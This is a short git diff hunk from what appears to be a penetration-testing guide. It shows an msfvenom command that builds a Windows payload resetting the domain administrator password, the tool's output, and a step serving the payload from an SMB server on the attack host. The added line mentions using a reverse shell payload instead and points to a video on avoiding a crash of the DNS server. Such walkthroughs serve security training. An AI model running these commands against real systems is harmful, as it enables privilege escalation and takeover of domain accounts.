@@ -319,6 +319,7 @@ $ sudo msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /do
 No encoder specified, outputting raw payload
 Payload size: 311 bytes
 ```
+>_A reverse shell payload could also be used. Passing any payload this way crashes the DNS server as it never really starts. More information on how to avoid that by passing the payload as a thread [here](https://youtu.be/8KJebvmd1Fk?t=3034)._
 
 Launch an SMB server on the attack host to serve the payload:
 
